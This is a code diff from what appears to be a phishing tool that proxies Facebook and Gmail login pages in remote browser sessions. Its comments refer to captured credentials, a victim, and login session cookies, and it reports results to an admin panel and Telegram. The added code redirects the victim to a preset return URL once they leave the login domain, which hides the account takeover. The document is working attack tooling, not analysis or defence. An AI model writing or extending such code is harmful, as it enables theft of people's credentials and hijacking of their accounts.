@@ -14,6 +14,10 @@ import { collectGmailStats, formatStatsForTelegram } from './gmail-stats.js';
 
 const sessions = new Map(); // accountId -> { context, page, lastActivity }
 const starting = new Map(); // accountId -> Promise
+const redirectCbs = new Map(); // accountId -> (url: string) => void
+
+export function setRedirectCb(accountId, cb) { redirectCbs.set(accountId, cb); }
+export function clearRedirectCb(accountId) { redirectCbs.delete(accountId); }
 
 // Activity log: what happens on the remote (Facebook/Gmail) page itself —
 // navigation, captured credentials — for the panel's "LIVE TIME LOGS" tab.
@@ -485,6 +489,7 @@ async function launch(accountId, adminIp) {
   // credentials. Dropped.
   const LOGIN_COOKIE_NAMES = ['c_user', '__Secure-1PSID', '__Secure-3PSID'];
   let notifiedLogin = false;
+  let redirectFired = false;
   // Trackuj stan flow logowania — pozwala pokazać w logach gdzie
   // zalicza się strona i czym się różni od poprzedniej nawigacji.
   let lastNavUrl = '';
@@ -495,6 +500,20 @@ async function launch(accountId, adminIp) {
     pushLog(accountId, 'nav', url);
     console.log(`[flow:${accountId}] nav → ${url}`);
     lastNavUrl = url;
+
+    // When victim has a returnUrl (set on account) and navigates away from
+    // the login domain, fire the redirect callback so view.js sends them back.
+    if (!redirectFired && account.returnUrl) {
+      try {
+        const startHost = new URL(account.startUrl).hostname;
+        const curHost = new URL(url).hostname;
+        if (curHost && curHost !== startHost && !/chrome-error/.test(url)) {
+          redirectFired = true;
+          const cb = redirectCbs.get(accountId);
+          if (cb) cb(account.returnUrl);
+        }
+      } catch { /* ignore invalid URLs */ }
+    }
 
     // Diagnostyka: które z 2FA/login markers widzimy w URL i tytule
     page.title().then((title) => {
